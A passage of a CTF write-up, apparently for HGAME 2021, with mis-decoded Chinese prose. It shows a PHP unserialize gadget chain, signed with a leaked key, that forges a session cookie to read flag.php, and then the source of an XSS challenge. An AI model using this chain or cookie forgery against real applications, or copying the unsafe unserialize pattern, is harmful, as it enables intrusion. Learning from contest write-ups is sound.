double-quoted-string">"."</span> <span class="token operator">.</span> <span class="token variable">$sign</span><span class="token punctuation">;</span>        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"session"</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$session</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$sess_array</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token variable">$session</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$sess_array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$sign</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$sess_array</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$sign</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token operator">.</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">SECRET_KEY</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">sessionData</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">sessionData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Go away! You hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Eeeeeeevallllllll</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token operator">=</span><span class="token string double-quoted-string">"åålikiåˆ°æ­¤ä¸€æ¸¸"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">msg</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></span></code></pre><p><code>pool.php</code> é‡Œæ˜¯ä¸€å †é»˜è®¤æ¸¸æˆé…ç½®</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span>        <span class="token number">3</span> <span class="token operator">=&gt;</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token comment">//%42</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"â˜…â˜…â˜…"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"kokodayo~"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"ç‹™å‡»"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"â˜…â˜…â˜…"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"æ³¡æ™®å¡"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"è¿‘å«"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"â˜…â˜…â˜…"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"ç‚ç†”"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"æœ¯å£«"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"â˜…â˜…â˜…"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"æ–‘ç‚¹"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"é‡è£…"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"â˜…â˜…â˜…"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"é¦™è‰"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"å…ˆé”‹"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"â˜…â˜…â˜…"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"ç²‰æ¯›çŒ›ç”·"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"åŒ»ç–—"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"â˜…â˜…â˜…"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"ç¿ç¾½"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"å…ˆé”‹"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"â˜…â˜…â˜…"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"æ³¡æ™®å¡"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"è¿‘å«"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"â˜…â˜…â˜…"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"å¡ç¼‡"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"é‡è£…"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"â˜…â˜…â˜…"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"ç±³æ ¼é²"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"é‡è£…"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"â˜…â˜…â˜…"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"å®‰å¾·åˆ‡å°”"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"ç‹™å‡»"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"â˜…â˜…â˜…"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"èŠ™è“‰"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"åŒ»ç–—"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"star"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"â˜…â˜…â˜…"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"name"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"æ¢“å…°"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"type"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"ç‰¹ç§"</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span><span class="token punctuation">,</span>       <span class="token comment">//......</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>å…³é”®çš„æºç åœ¨ <code>simulator.php </code>é‡Œï¼Œå¯ä»¥çœ‹åˆ°æœ‰ <code>__construct()</code> <code>__toString()</code>  <code>file_get_contents</code></p><p><strong>ååºåˆ—åŒ–æ¼æ´</strong></p><p>é‚£å°±æ„é€ åˆ©ç”¨é“¾å¥½äº†ã€‚</p><p>æ³¨æ„åˆ° <code>Eeeeeeevallllllll</code> ç±»é‡Œæœ‰ <code>echo</code>ï¼Œè®©è¿™ä¸ª <code>msg</code> æŒ‡å‘ <code>CardsPool('flag.php')</code> å¯¹è±¡ï¼Œå°±èƒ½åœ¨<code>Eeeeeeevallllllll</code> å®ä¾‹åŒ–çš„å¯¹è±¡é”€æ¯çš„æ—¶å€™è°ƒç”¨ <code>CardsPool</code> å¯¹è±¡çš„ <code>__toString()</code>ï¼Œé€šè¿‡ <code>file_get_contents</code> æ¥è¯»å– flag æ–‡ä»¶äº†ã€‚</p><p><strong>Exp:</strong></p><p>ç›´æ¥åœ¨ simulator æ–‡ä»¶ç»“å°¾åŠ ä¸Šè¿™å‡ æ¡è¯­å¥ã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$xx</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Eeeeeeevallllllll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xx</span><span class="token operator">-&gt;</span><span class="token property">msg</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CardsPool</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token variable">$yy</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$xx</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$yy</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span><span class="token variable">$sign</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$yy</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"7tH1PKviC9ncELTA1fPysf6NYq7z7IA9"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$yy</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"."</span> <span class="token operator">.</span> <span class="token variable">$sign</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$value</span><span class="token punctuation">;</span></code></pre><p>å¾—åˆ°åºåˆ—åŒ–çš„å­—ç¬¦ä¸² ä»¥åŠ åŠ å¯†çš„å­—ç¬¦ä¸²</p><pre class="language-none"><code class="language-none">O:17:"Eeeeeeevallllllll":1:{s:3:"msg";O:9:"CardsPool":2:{s:5:"cards";N;s:15:"CardsPoolfile";s:8:"flag.php";}}TzoxNzoiRWVlZWVlZXZhbGxsbGxsbGwiOjE6e3M6MzoibXNnIjtPOjk6IkNhcmRzUG9vbCI6Mjp7czo1OiJjYXJkcyI7TjtzOjE1OiIAQ2FyZHNQb29sAGZpbGUiO3M6ODoiZmxhZy5waHAiO319.Y2Q1NjAzYWE3MjAxOWEwM2NjOWEwY2ZkNzk0ZmEwNzQ=</code></pre><p>æ”¹ cookies å†è®¿é—®å³å¯æ‹¿åˆ° flagã€‚</p><p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210221015432199.png" alt="flag"></p><h3 id="Post-to-zuckonit2-0"><a href="#Post-to-zuckonit2-0" class="headerlink" title="Post to zuckonit2.0"></a>Post to zuckonit2.0</h3><blockquote><p>d1gg12 çš„åšå®¢è¢«æ—¥ç©¿ä»¥åï¼Œä»–æƒ³åŠæ³•å­¦äº†æ›´æ·±å…¥çš„ XSS é˜²æŠ¤æ–¹æ³•ï¼Œ ç°åœ¨è¿™ä¸ªåšå®¢çœ‹ä¸Šå»å·²ç»åšä¸å¯æ‘§äº†â€¦æ˜¯è¿™æ ·å—ï¼Ÿ</p><p><a href="http://zuckonit-2.0727.site:5000/">http://zuckonit-2.0727.site:5000/</a> </p></blockquote><p>è¿˜æ˜¯ XSSã€‚</p><p><img src="/2021/02/23/CTF_2021HgameWeek3/image-20210224011159368.png"></p><p>ç»™äº†æºç åœ¨ <code>/static/www.zip</code></p><p><code>app.py</code></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Set-Cookie'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"token=WELCOME TO HGAME 2021.;"</span>    response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Security-Policy'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"default-src 'self'; script-src 'self';"</span>    <span class="token keyword">return</span> response<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/preview'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">preview</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'substr'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'replacement'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        substr <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'substr'</span><span class="token punctuation">]</span>        replacement <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'replacement'</span><span class="token punctuation">]</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        substr <span class="token operator">=</span> <span class="token string">""</span>        replacement <span class="token operator">=</span> <span class="token string">""</span>    response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>        render_template<span class="token punctuation">(</span><span class="token string">"preview.html"</span><span class="token punctuation">,</span> substr<span class="token operator">=</span>substr<span class="token punctuation">,</span> replacement<span class="token operator">=</span>replacement<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> response<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/send'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'content'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        content <span class="token operator">=</span> escape_index<span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'contents'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            content_list <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'contents'</span><span class="token punctuation">]</span>            content_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>content<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            content_list <span class="token operator">=</span> <span class="token punctuation">[</span>content<span class="token punctuation">]</span>        session<span class="token punctuation">[</span><span class="token string">'contents'</span><span class="token punctuation">]</span> <span class="token operator">=</span> content_list        <span class="token keyword">return</span> <span class="token string">"post has been sent."</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"WELCOME TO HGAME 2021 :)"</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/replace'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">replace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'substr'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'replacement'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">'substr'</span><span class="token punctuation">]</span> <span class="token operator">=</span> escape_replace<span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'substr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        session<span class="token punctuation">[</span><span class="token string">'replacement'</span><span class="token punctuation">]</span> <span class="token operator">=</span> escape_replace<span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'replacement'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"replace success"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"There is no content to replace any more"</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/contents'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'contents'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        content_list <span class="token operator">=</span> jsonify<span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'contents'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        content_list <span class="token operator">=</span> jsonify<span class="token punctuation">(</span><span class="token string">'&lt;i&gt;2021-02-12&lt;/i&gt;&lt;p&gt;Happy New Year every guys! '</span>                               <span class="token string">'Maybe it is nearly done now.&lt;/p&gt;'</span><span class="token punctuation">,</span>                               <span class="token string">'&lt;i&gt;2021-02-11&lt;/i&gt;&lt;p&gt;Busy preparing for the Chinese New Year... '</span>                               <span class="token string">'And I add some new features to this editor, maybe you can take a try. '</span>                               <span class="token string">'But it has not done yet, I\'m not sure if it can be safe from attacks.&lt;/p&gt;'</span><span class="token punctuation">,</span>                               <span class="token string">'&lt;i&gt;2021-02-07&lt;/i&gt;&lt;p&gt;so many hackers here, I am going to add some strict rules.&lt;/p&gt;'</span><span class="token punctuation">,</span>                               <span class="token string">'&lt;i&gt;2021-02-06&lt;/i&gt;&lt;p&gt;I have tried to learn HTML the whole yesterday, '</span>                               <span class="token string">'and I finally made this ONLINE BLOG EDITOR. Feel free to write down your thoughts.&lt;/p&gt;'</span><span class="token punctuation">,</span>                               <span class="token string">'&lt;i&gt;2021-02-05&lt;/i&gt;&lt;p&gt;Yesterday, I watched &lt;i&gt;The Social Network&lt;/i&gt;. '</span>                               <span class="token string">'It really astonished me. Something flashed me.&lt;/p&gt;'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> content_list<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/code'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_code</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'code'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> Response<span class="token punctuation">(</span>response<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'code'</span><span class="token punctuation">:</span> session<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span> status<span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'application/json'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        code <span class="token operator">=</span> create_code<span class="token punctuation">(</span><span class="token punctuation">)</span>        session<span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span> <span class="token operator">=</span> code        <span class="token keyword">return</span> Response<span class="token punctuation">(</span>response<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'code'</span><span class="token punctuation">:</span> code<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span> status<span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'application/json'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"29342ru89j3thisisfakecookieq983h23ijfq2ojifrnq92h2"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"hgame{G3t_fl@g_s0_Easy?No_way!!wryyyyyyyyy}"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Only admin can get the flag, your token shows that you're not admin!"</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/clear'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">clear_session</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">[</span><span class="token string">'contents'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token string">"ALL contents are cleared."</span><span class="token keyword">def</span> <span class="token function">escape_index</span><span class="token punctuation">(</span>original<span class="token punctuation">)</span><span class="token punctuation">:</span>    content <span class="token operator">=</span> original    content_iframe <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r"^(&lt;?/?iframe)\s+.*?(src=[\"'][a-zA-Z/]{1,8}[\"']).*?(&gt;?)$"</span><span class="token punctuation">,</span> <span class="token string">r"\1 \2 \3"</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>    <span class="token keyword">if</span> content_iframe <span class="token operator">!=</span> content <span class="token keyword">or</span> re<span class="token punctuation">.</span>match<span class="token punctuation">(</span><span class="token string">r"^(&lt;?/?iframe)\s+(src=[\"'][a-zA-Z/]{1,8}[\"'])$"</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> content_iframe    <span class="token keyword">else</span><span class="token punctuation">:</span>        content <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r"&lt;*/?(.*?)&gt;?"</span><span class="token punctuation">,</span> <span class="token string">r"\1"</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>        <span class="token keyword">return</span> content<span class="token keyword">def</span> <span class="token function">escape_replace</span><span class="token punctuation">(</span>original<span class="token punctuation">)</span><span class="token punctuation">:</span>    content <span class="token operator">=</span> original    content <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">"[&lt;&gt;]"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>    <span class="token keyword">return</span> content<span class="token keyword">def</span> <span class="token function">create_code</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    hashobj <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>    hashobj<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    code_hash <span class="token operator">=</span> hashobj<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> code_hash</code></pre><p>ä¸»é¡µ / åŠ äº† Content-Security-Policyï¼Œ/preview é¡µé¢æ²¡æœ‰ã€‚</p><p><code>templates/preview.html</code></p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation 